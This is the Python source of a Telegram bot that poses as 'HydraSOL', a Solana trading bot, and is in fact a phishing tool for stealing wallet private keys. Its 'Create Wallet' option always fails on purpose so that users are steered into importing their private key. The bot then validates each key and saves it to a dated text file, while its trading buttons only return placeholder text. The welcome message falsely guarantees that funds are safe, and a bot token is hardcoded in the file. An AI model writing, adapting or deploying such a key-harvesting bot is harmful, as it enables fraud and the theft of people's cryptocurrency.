import base58
from solders.keypair import Keypair
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters
import os
import datetime

# Define your bot token here
TOKEN = '7725028315:AAF0xi0pqTWGtrtGlgPOqeFw6frEcRFDbvI'

# Define the welcome message
WELCOME_MESSAGE = """
Welcome to <b>HydraSOL,</b>
Solana's fastest trading bot for any token, built by the Hydra team.

You currently do not have a Solana wallet with us, please use the button below to create one (Create Wallet), or import your private key (Import Private Key)

Once done, you will load into the trading section of a bot.

To buy a token enter a ticker, token address, or a URL from pump.fun, DexScreener, or Raydium.

We guarantee the safety of user funds on HydraSOL, but if you expose your private key your funds will not be safe.
"""

# Function to handle the /start command
async def start(update: Update, context: CallbackContext) -> None:
    # Check if the image file exists before trying to send it
    image_path = 'pixlr.png'
    if os.path.exists(image_path):
        with open(image_path, 'rb') as photo:
            await update.message.reply_photo(photo=photo)
    else:
        # If the image doesn't exist, just send a welcome message
        await update.message.reply_text('Welcome to HydraSOL Bot!')

    # Create buttons for creating wallet or importing private key
    keyboard = [
        [
            InlineKeyboardButton("Create Wallet", callback_data='create_wallet'),
            InlineKeyboardButton("Import Private Key", callback_data='import_key')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Send the welcome message with the buttons
    await update.message.reply_text(WELCOME_MESSAGE, parse_mode='HTML', reply_markup=reply_markup)

# Function to handle the /trade command
async def trade(update: Update, context: CallbackContext) -> None:
    # Check if the user has validated their private key
    user_id = update.message.from_user.id
    if user_id not in context.user_data or not context.user_data[user_id].get('private_key_valid', False):
        await update.message.reply_text("❌ You must import and validate your private key before trading. Please use the /start command to do so.")
        return

    # Send the contract address request and the menu options
    contract_message = "✔️ Send contract address to start trading. Please configure settings before trading."
    keyboard = [
        [
            InlineKeyboardButton("💰 Buy/Sell", callback_data='buy_sell'),
            InlineKeyboardButton("🏦 Assets", callback_data='assets')
        ],
        [
            InlineKeyboardButton("⚙️ Settings", callback_data='settings'),
            InlineKeyboardButton("💳 Wallet", callback_data='wallet')
        ],
        [
            InlineKeyboardButton("🗣️ Language", callback_data='language'),
            InlineKeyboardButton("📖 Help", callback_data='help')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(contract_message, reply_markup=reply_markup)

# Callback handler for button clicks
async def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == 'create_wallet':
        # Send new message when "Create Wallet" is clicked
        keyboard = [
            [
                InlineKeyboardButton("Restart", callback_data='restart')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            text="⚠️ Due to large server load we were unable to create a wallet for you.\n\nPlease try again later or import your own wallet's private key.",
            reply_markup=reply_markup
        )
    
    elif query.data == 'import_key':
        # Set flag in user_data that the bot is waiting for private key
        context.user_data[query.from_user.id] = {'waiting_for_private_key': True}
        await query.message.reply_text(
            text="✅ Please send your Solana wallet's private key here.\n\n"
                 "❓ If you are unsure how to find your private key, you can find a guide for SolFlare and Phantom wallets here: "
                 "https://smithii.io/en/get-private-key-solana/"
        )
    
    elif query.data == 'buy_sell':
        await query.message.reply_text(text="💰 Let's start trading! Here you can choose to buy or sell tokens.")
    elif query.data == 'assets':
        await query.message.reply_text(text="🏦 Here are your assets details.")
    elif query.data == 'settings':
        await query.message.reply_text(text="⚙️ You can configure your settings here.")
    elif query.data == 'wallet':
        await query.message.reply_text(text="💳 Here is your wallet information.")
    elif query.data == 'language':
        await query.message.reply_text(text="🗣️ Choose your preferred language.")
    elif query.data == 'help':
        await query.message.reply_text(text="📖 Here's the help section where you can find more information.")
    elif query.data == 'restart':
        # When the "Restart" button is pressed, restart the conversation by calling /start
        await start(update, context)

# Function to validate the private key (Solana Keypair)
def validate_private_key(private_key: str) -> bool:
    """
    Validate whether the private key is:
    - A valid 64-byte Base58 encoded string
    - A valid list of integers
    """
    try:
        # Check if the private key is a string representing a list of integers
        if private_key.startswith('[') and private_key.endswith(']'):
            # Remove the surrounding brackets and split by commas
            private_key = private_key[1:-1].replace(' ', '').split(',')
            # Convert the list of string integers into a list of actual integers
            private_key_bytes = bytes(int(byte) for byte in private_key)

            # Ensure it's 64 bytes long
            if len(private_key_bytes) != 64:
                return False

            # Try to generate a Keypair from the bytes
            Keypair.from_bytes(private_key_bytes)
            return True
        
        # If it's not in the list format, proceed with base58 validation
        decoded_key = base58.b58decode(private_key)
        if len(decoded_key) != 64:
            return False
        
        # Check if it can be used to generate a valid Keypair
        Keypair.from_bytes(decoded_key)
        return True

    except Exception as e:
        print(f"Error validating private key: {e}")
        return False

# Function to handle unknown commands or messages (besides /start)
async def handle_message(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id in context.user_data and context.user_data[user_id].get('waiting_for_private_key', False):
        # The user is in the process of importing a private key
        private_key = update.message.text.strip()
        
        # Validate the private key
        if validate_private_key(private_key):
            context.user_data[user_id]['private_key_valid'] = True
            del context.user_data[user_id]['waiting_for_private_key']  # Remove the waiting flag
            await update.message.reply_text("✅ Your private key has been successfully imported and validated!")

            # Save the valid private key to a file
            save_private_key_to_file(private_key)

        else:
            await update.message.reply_text("❌ The private key you provided is invalid. Please check and try again.")
    else:
        # Handle other messages here if needed
        pass

# Function to save the valid private key to a file named "keys_[TODAYS_DATE].txt"
def save_private_key_to_file(private_key: str):
    # Get today's date in YYYY-MM-DD format
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    filename = f"keys_{today}.txt"

    # Open the file in append mode, create it if it doesn't exist
    with open(filename, 'a') as file:
        file.write(private_key + '\n')

# Function to handle restart (go back to /start)
async def restart(update: Update, context: CallbackContext) -> None:
    # Restart the conversation by calling /start again
    await start(update, context)

def main():
    # Create the Application instance with the bot token
    application = Application.builder().token(TOKEN).build()

    # Register the command handler for /start
    application.add_handler(CommandHandler("start", start))

    # Register the command handler for /trade
    application.add_handler(CommandHandler("trade", trade))

    # Register the callback handler for button presses
    application.add_handler(CallbackQueryHandler(button))

    # Register the handler for the "restart" button
    application.add_handler(CallbackQueryHandler(restart, pattern='^restart$'))

    # Register the handler to handle private key input from users
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
